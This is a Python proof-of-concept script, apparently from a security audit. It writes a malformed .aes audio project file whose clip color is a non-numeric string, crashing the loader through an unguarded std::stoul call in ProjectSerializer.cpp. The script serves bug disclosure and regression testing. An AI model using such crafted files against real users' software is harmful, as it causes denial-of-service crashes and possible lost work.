#!/usr/bin/env python3
"""
RTM-009 PoC: ProjectSerializer clip color std::stoul crash
Severity: Medium
File: Source/Core/ProjectSerializer.cpp line 691

The lane color stoul (line 628) is wrapped in try/catch (SEC-001 fix).
But the clip color stoul (line 691) is NOT protected.
A crafted .aes project with a malformed clip color crashes on load.
"""

import json
import sys
import os

def create_malicious_project(output_path):
    """
    Create a crafted .aes-style project file that contains a clip whose `color` field is a non-numeric string to demonstrate a parsing crash.
    
    The function ensures the output directory exists, writes a JSON project payload to output_path, and prints the written file path, size, and a brief note about the expected crash site related to parsing the clip color.
    
    Parameters:
        output_path (str): Filesystem path where the generated project file will be written.
    """
    project = {
        "version": 2,
        "bpm": 120.0,
        "timeSignature": 4,
        "lanes": [
            {
                "id": 1,
                "type": "pattern",
                "name": "Lane 1",
                "color": "0xFF0000FF",
                "playlist": {
                    "clips": [
                        {
                            "id": "clip-001",
                            "patternId": "pat-001",
                            "start": 0.0,
                            "duration": 4.0,
                            "name": "Malicious Clip",
                            "color": "not_a_number",
                            "edits": {
                                "gain": 1.0,
                                "pan": 0.0,
                                "muted": False,
                                "playbackRate": 1.0,
                                "fadeIn": 0.0,
                                "fadeOut": 0.0,
                                "sourceStart": 0.0
                            }
                        }
                    ]
                }
            }
        ],
        "arsenal": [],
        "patterns": [
            {
                "id": "pat-001",
                "name": "Test Pattern",
                "units": []
            }
        ]
    }

    os.makedirs(os.path.dirname(output_path) if os.path.dirname(output_path) else ".", exist_ok=True)
    with open(output_path, "w") as f:
        json.dump(project, f)

    size = os.path.getsize(output_path)
    print(f"[+] PoC: {output_path} ({size} bytes)")
    print(f"[+] Clip color = 'not_a_number' → std::stoul → std::invalid_argument → crash")
    print(f"[+] Line 691: clip.colorRGBA = static_cast<uint32_t>(std::stoul(cj[c][\"color\"].asString()));")
    print(f"[+] Compare with line 628 (lane color) which IS wrapped in try/catch")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output.aes>")
        sys.exit(1)
    create_malicious_project(sys.argv[1])
